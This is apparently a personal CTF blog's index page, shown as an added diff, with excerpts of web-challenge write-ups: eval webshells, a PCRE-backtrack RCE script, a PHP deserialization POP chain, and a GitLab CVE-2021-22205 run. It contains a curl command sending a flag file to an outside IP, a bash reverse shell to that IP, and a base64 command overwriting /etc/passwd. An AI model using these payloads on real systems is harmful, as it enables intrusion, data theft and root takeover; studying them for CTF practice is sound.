@@ -1,0 +1,820 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="万幸得以相识">
+<meta property="og:type" content="website">
+<meta property="og:title" content="晴川&#39;s Blog">
+<meta property="og:url" content="https://qingchuana.github.io/index.html">
+<meta property="og:site_name" content="晴川&#39;s Blog">
+<meta property="og:description" content="万幸得以相识">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Qingchuan">
+<meta property="article:tag" content="ctf 小菜鸡 热爱">
+<meta name="twitter:card" content="summary"><title>晴川's Blog</title><link ref="canonical" href="https://qingchuana.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/11/15/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon/">NSSCTF题目练习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-11-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-15</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="NSSCTF题目练习">
+          <a href="#NSSCTF题目练习" class="heading-link"><i class="fas fa-link"></i></a><a href="#NSSCTF题目练习" class="headerlink" title="NSSCTF题目练习"></a>NSSCTF题目练习</h1>
+      
+        <h2 id="羊城杯-2020-easycon">
+          <a href="#羊城杯-2020-easycon" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h2>
+      <p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120408654-1700014518989-3-1700014609953-9-1700015416328-19.png"></p>
+<p>御剑扫到2个相关，访问url&#x2F;index.php跳转到</p>
+<p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120610438-1700014609945-7.png"></p>
+<p>之后出现</p>
+<p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120504348-1700014609945-8.png"></p>
+<p>那个弹窗eval post cmd应该是提示，</p>
+<p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120721712.png"></p>
+<p>果然，可以执行命令，我们cmd&#x3D;system(“cat b*”);</p>
+<p>发现出现一堆编码，猜测是base64转图片。转换得到flag</p>
+<p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917120911281.png"></p>
+
+        <h2 id="NSSRound-1-Basic-basic-check">
+          <a href="#NSSRound-1-Basic-basic-check" class="heading-link"><i class="fas fa-link"></i></a><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2>
+      <p>bp抓包，改请求方式为PUT，写个一句话木马</p>
+<p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917121422892.png"></p>
+<p>发现1.php被写入成功</p>
+<p>回到网页访问，执行命令</p>
+<p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917121538182.png"></p>
+<p>##[MoeCTF 2022]ezhtml</p>
+<p>查看页面源代码，在evil.js文件里发现flag</p>
+
+        <h2 id="NISACTF-2022-middlerce">
+          <a href="#NISACTF-2022-middlerce" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>这题炸似一看很简单，一道rce罢了，试了试，难以言说。。。。。</p>
+<p>这道题需要用到prce回溯，正则匹配的回溯次数按英文版来最大此时是100万，就是说，正则匹配，匹配100万次后，便不再匹配，可以看这片文章<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>后面还有一个json_decode解码</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br></pre></td></tr></table></div></figure>
+
+<p>本地测试一下</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;111111&quot;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$a</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$command</span>);</span><br><span class="line"><span class="comment">//string(6) &quot;111111&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>就是解码之后会返回cmd所对应的字符串</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload=&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27; + &quot;@&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line">res = requests.post(&quot;node4.anna.nssctf.cn:28390&quot;, data=&#123;&quot;letter&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/11/15/[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]easycon/image/image-20230917135439689.png"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/11/11/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/">[ 文章无标题 ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-11-11</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h2 id="新型车联网安全网络协议破解（阶段一）">
+          <a href="#新型车联网安全网络协议破解（阶段一）" class="heading-link"><i class="fas fa-link"></i></a><a href="#新型车联网安全网络协议破解（阶段一）" class="headerlink" title="新型车联网安全网络协议破解（阶段一）"></a>新型车联网安全网络协议破解（阶段一）</h2>
+      <p>下载vpn访问后是一个git</p>
+<p>需要用Proxifier配置代理</p>
+<p>配置代理服务</p>
+<p><img src="/2023/11/11/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20231111175609407-1699697773720-4-1699698037625-91.png" alt="image-20231111175609407"></p>
+<p>配置代理规则</p>
+<p><img src="/2023/11/11/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20231111175746684-1699698037624-88.png" alt="image-20231111175746684"></p>
+<p>之后利用脚本</p>
+<figure class="highlight handlebars"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">https://github.com/Al1ex/CVE-2021-22205</span></span><br></pre></td></tr></table></div></figure>
+
+<p>检测漏洞</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-22205.py -v true -t http://172.18.0.4/</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/11/11/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20231111175940503-1699698037625-89.png" alt="image-20231111175940503"></p>
+<p>存在漏洞</p>
+<p>执行命令</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-22205.py -a true -t http://172.18.0.4/ -c &quot;curl -T /home/mping/flag http://123.57.236.154:80&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/11/11/%E6%96%B0%E5%9E%8B%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3%EF%BC%88%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%89/AAwangzhan\1\hexoblog\source\image\image-20231111180232257-1699698037625-90.png" alt="image-20231111180232257"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/">[ 文章无标题 ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>流量包分析</p>
+<p>http.request.method&#x3D;&#x3D;”POST”  and  http contains </p>
+<p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/AAwangzhan\1\hexoblog\source\image\19154337_6490072934feb23186.webp" alt="19154337_6490072934feb23186"></p>
+<ol>
+<li><p>首先第一个问题显而易见是<code>Nmap</code>的端口扫描和服务识别，且<code>tcp contains &quot;nmap&quot;</code>可以流量中发现很多Nmap关键字</p>
+</li>
+<li><p>从流量整体来看，大部分流量包并没有建立起TCP全连接，所以这里应该是<code>TCP SYN扫描</code>，也叫<code>半连接扫描</code>或者<code>半开放扫描</code></p>
+</li>
+<li><p>一直在尝试对其他IP发起TCP连接的扫描的IP也显而易见就是<code>192.168.0.4</code></p>
+</li>
+<li></li>
+<li><p>TCP扫描端口，如果端口开放，则服务端会返回<code>SYN + ACK</code>标志位都处于Set状态的包</p>
+</li>
+<li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/AAwangzhan\1\hexoblog\source\image\resize,m_fixed,w_1184.webp" alt="从一道题分析Nmap SYN/半连接/半开放扫描流量_TCP半连接扫描_02"></p>
+</li>
+<li><p>利用过滤器：<code>tcp.flags.syn==1 and tcp.flags.ack==1</code>，过滤出两个标志位都处于Set状态下的包，然后包中的源端口即是扫描到的开放端口：<code>80、135、139、445、3389、3306、49157、49165、49155、49154、49153、49152</code></p>
+</li>
+<li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/AAwangzhan\1\hexoblog\source\image\resize,m_fixed,w_1184-1698214009015-4.webp" alt="从一道题分析Nmap SYN/半连接/半开放扫描流量_半开放扫描_03"></p>
+</li>
+<li></li>
+<li><p><code>tcp contains &quot;Apache&quot;</code>查找关键字即可在HTTP响应头中发现<code>Apache/2.4.23</code></p>
+</li>
+<li><p><img src="/2023/10/25/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90/AAwangzhan\1\hexoblog\source\image\resize,m_fixed,w_1184.webp" alt="从一道题分析Nmap SYN/半连接/半开放扫描流量_TCP半连接扫描_04"></p>
+</li>
+</ol>
+<p>nmap开放端口筛选：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.flags.syn==1 and tcp.flags.ack==1</span><br></pre></td></tr></table></div></figure></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/25/new%20starweek%204/">[ 文章无标题 ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>new starweek 4</p>
+<p>?key&#x3D;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad”;s:3:”cmd”;s:7:”cat &#x2F;f*”;}</p>
+<p>打开链接，存在很多个类，很明显是php反序列化漏洞利用，需要构造pop链 ，</p>
+<p>关于pop链构造的详细步骤教学，请参考我之前的博客，真的讲得很详细也容易理解：</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://t.csdnimg.cn/wMYNB">http://t.csdnimg.cn/wMYNB</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>如果你是刚接触php反序列化利用的题，那么建议先看基础的原理知识：</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://t.csdnimg.cn/xhqzq">http://t.csdnimg.cn/xhqzq</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://t.csdnimg.cn/jzQjt">http://t.csdnimg.cn/jzQjt</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://t.csdnimg.cn/IHpEq">http://t.csdnimg.cn/IHpEq</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>由于这道题还出现了</p>
+<p>throw new Exception(“Nope”);</p>
+<p>这个throw就是GC回收（垃圾回收机制），这里需要绕过它。</p>
+<p>首先我们需要知道：</p>
+<p>在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。</p>
+<p>当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。</p>
+<p>我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。</p>
+<p>触发垃圾回收机制的方法有：（本质即使对象引用计数归零）</p>
+<p>（1）对象被unset()处理时，可以触发。</p>
+<p>（2）数组对象为NULL时，可以触发。</p>
+<p>我们先正常构造pop链：</p>
+<p>关于pop链的构造和标注真的看我之前那篇博客肯定能懂</p>
+<pre><code>&lt;?php
+ 
+class Start&#123;
+    public $errMsg;  // 5 Crypto
+    public function __destruct() &#123;
+        die($this-&gt;errMsg);  
+    &#125;
+&#125;
+ 
+class Pwn&#123;
+    public $obj;   // 2 Web
+    public function __invoke()&#123;
+        $this-&gt;obj-&gt;evil();
+    &#125;
+    public function evil() &#123;
+        phpinfo();
+    &#125;
+&#125;
+ 
+class Reverse&#123;
+    public $func;  // 3 Pwn
+    public function __get($var) &#123;
+        ($this-&gt;func)();
+    &#125;
+&#125;
+ 
+class Web&#123; 
+    public $func; // 1 system
+    public $var;  // 1 cat /f*
+    public function evil() &#123;
+        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123;
+            ($this-&gt;func)($this-&gt;var);
+        &#125;else&#123;
+            echo &quot;Not Flag&quot;;
+        &#125;
+    &#125;
+&#125;
+ 
+class Crypto&#123;
+    public $obj;  // 4 Reverse
+    public function __toString() &#123;
+        $wel = $this-&gt;obj-&gt;good;
+        return &quot;NewStar&quot;;
+    &#125;
+&#125;
+ 
+class Misc&#123;  
+    public function evil() &#123;
+        echo &quot;good job but nothing&quot;;
+    &#125;
+&#125;
+ 
+$w = new Web();
+$w-&gt;func = &#39;system&#39;;
+$w-&gt;var = &#39;cat /f*&#39;;
+$p = new Pwn();
+$p-&gt;obj = $w;
+$r = new Reverse();
+$r-&gt;func = $p;
+$c = new Crypto();
+$c-&gt;obj = $r;
+$s = new Start();
+$s-&gt;errMsg = $c;
+echo serialize($s);
+ 
+?&gt;
+</code></pre>
+<p>我们使用第二中方法（数组对象为NULL）绕过GC回收：</p>
+<pre><code>&lt;?php
+ 
+class Start&#123;
+    public $errMsg;  // 5 Crypto
+    public function __destruct() &#123;
+        die($this-&gt;errMsg);  
+    &#125;
+&#125;
+ 
+class Pwn&#123;
+    public $obj;   // 2 Web
+    public function __invoke()&#123;
+        $this-&gt;obj-&gt;evil();
+    &#125;
+    public function evil() &#123;
+        phpinfo();
+    &#125;
+&#125;
+ 
+class Reverse&#123;
+    public $func;  // 3 Pwn
+    public function __get($var) &#123;
+        ($this-&gt;func)();
+    &#125;
+&#125;
+ 
+class Web&#123; 
+    public $func; // 1 system
+    public $var;  // 1 cat /f*
+    public function evil() &#123;
+        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123;
+            ($this-&gt;func)($this-&gt;var);
+        &#125;else&#123;
+            echo &quot;Not Flag&quot;;
+        &#125;
+    &#125;
+&#125;
+ 
+class Crypto&#123;
+    public $obj;  // 4 Reverse
+    public function __toString() &#123;
+        $wel = $this-&gt;obj-&gt;good;
+        return &quot;NewStar&quot;;
+    &#125;
+&#125;
+ 
+class Misc&#123;  
+    public function evil() &#123;
+        echo &quot;good job but nothing&quot;;
+    &#125;
+&#125;
+ 
+$w = new Web();
+$w-&gt;func = &#39;system&#39;;
+$w-&gt;var = &#39;cat /f*&#39;;
+$p = new Pwn();
+$p-&gt;obj = $w;
+$r = new Reverse();
+$r-&gt;func = $p;
+$c = new Crypto();
+$c-&gt;obj = $r;
+$s = new Start();
+$s-&gt;errMsg = $c;
+ 
+$b=array($s,0);
+echo serialize($b); 
+ 
+?&gt;
+</code></pre>
+<p><img src="/2023/10/25/new%20starweek%204/AAwangzhan\1\hexoblog\source\image\image-20231025095940311.png" alt="image-20231025095940311"></p>
+<p>运行得到：</p>
+<p>a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:1;i:0;} </p>
+<p>我们将最后的 i:1 替换为 i:0</p>
+<p>即：</p>
+<p>a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:0;i:0;} </p>
+<p>构造payload：</p>
+<p>post：fast&#x3D;a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:0;i:0;} </p>
+<p><img src="/2023/10/25/new%20starweek%204/AAwangzhan\1\hexoblog\source\image\image-20231025100216201.png" alt="image-20231025100216201"></p>
+<p>拿到flag</p>
+<p>flag{558eb633-8715-4922-8201-f8402343b140} </p>
+<p>当然这里保险一点的做法是先执行 ls 命令，然后再使用 ..&#x2F;..&#x2F;..&#x2F; 进行目录穿越 ，找到flag所在目录，再进行 cat，并且这里过滤了关键字 flag，因此我们使用通配符 * 进行匹配。</p>
+<p>bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;123.57.236.154&#x2F;9999 0&gt;&amp;1&quot;</p>
+<p>只是说一般 flag 都在根目录下，所以我直接 cat &#x2F;f*。</p>
+<p>echo ‘d3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgphYmM6JDEkMSoyKjMkR0RYZWNvOXVhR0IuUTBpMHdzRkNBMTowOjA6cm9vdDovcm9vdDovYmluL2Jhc2g&#x3D;’ | base64 -d &gt; &#x2F;etc&#x2F;passwd</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /f1ger -o rw,remount</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /f1ger-o ro,remount</span><br></pre></td></tr></table></div></figure>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/24/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/">[ 文章无标题 ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="小迪安全知识积累">
+          <a href="#小迪安全知识积累" class="heading-link"><i class="fas fa-link"></i></a><a href="#小迪安全知识积累" class="headerlink" title="小迪安全知识积累"></a>小迪安全知识积累</h1>
+      <p> php源码里面有乱码，开头是zend,去搜php解密<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.toolnb.com/tools/phpcarbylamine.html">https://www.toolnb.com/tools/phpcarbylamine.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>.net文件反编译</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/19/2023%E5%B9%B4SWPU%20NSS%20%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9B%20(%E6%A0%A1%E5%A4%96%E8%B5%9B%E9%81%93)/">2023年SWPU NSS 秋季招新赛 (校外赛道)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-10-19</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="2023年SWPU-NSS-秋季招新赛-校外赛道">
